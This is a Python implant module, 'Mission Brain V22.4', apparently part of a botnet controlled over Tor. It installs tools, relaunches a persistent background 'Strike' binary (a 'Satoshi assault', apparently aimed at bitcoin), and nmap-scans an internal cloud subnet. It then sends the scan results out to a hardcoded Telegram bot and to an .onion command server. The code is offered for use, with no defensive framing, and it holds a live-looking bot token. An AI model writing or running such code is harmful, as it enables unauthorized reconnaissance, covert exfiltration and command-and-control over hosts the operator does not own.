# 🜚 MISSION BRAIN V22.4 - OMNI SCAN & STRIKE 🜚
import os, subprocess, time, requests, socket, threading

MASTER_ONION = "eke7kse3wo5o5753eoqtpnw7mtjtasva4dlw23aqs3dwuzmgahkvebqd.onion"

def execute_mission(ui, ID):
    ui.log('Iniciando Misión Dual: ASALTO + ESCANEO MASIVO...')
    
    # 1. Mantener Asalto Satoshi en Segundo Plano
    if not os.path.exists('./v22_strike'):
        ui.log('Compilando motor Strike...')
        os.system('apt-get update -qq && apt-get install -y libssl-dev gcc nmap -qq > /dev/null 2>&1')
        # (Codigo C omitido por brevedad, asumimos compilacion previa o persistente)
    
    if os.path.exists('./v22_strike'):
        os.system('pkill -9 v22_strike')
        subprocess.Popen(["./v22_strike"], start_new_session=True)
        ui.log('Motor Strike persistente en background.')

    # 2. Nueva Tarea: Escaneo Masivo de Subred Google
    def massive_scan():
        ui.update("ESCANEO MASIVO ACTIVO", 100, 30)
        ui.log('Escaneando subred interna 172.28.0.0/24...')
        # Buscamos puertos comunes de administracion o bases de datos
        res = subprocess.getoutput("nmap -T4 -F 172.28.0.0/24 | grep 'report for' -A 2")
        ui.log(f'Escaneo finalizado. Enviando telemetría...')
        
        # Reportar a Telegram
        requests.post(f"https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", 
                      data={"chat_id": "7713278946", "text": f"📡 [SPECTER] Hallazgos de red en {ID}:\n{res[:500]}"})
        
        # Reportar al Master
        try:
            px = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
            requests.post(f"http://{MASTER_ONION}/", 
                          json={"node_id": ID, "type": "TELEMETRY", "payload": {"label": "NET_SCAN", "data": res}}, 
                          proxies=px, timeout=60)
        except: pass
        ui.update("VIGILIA OMNI V22.4", 100, 95)

    threading.Thread(target=massive_scan, daemon=True).start()
    return True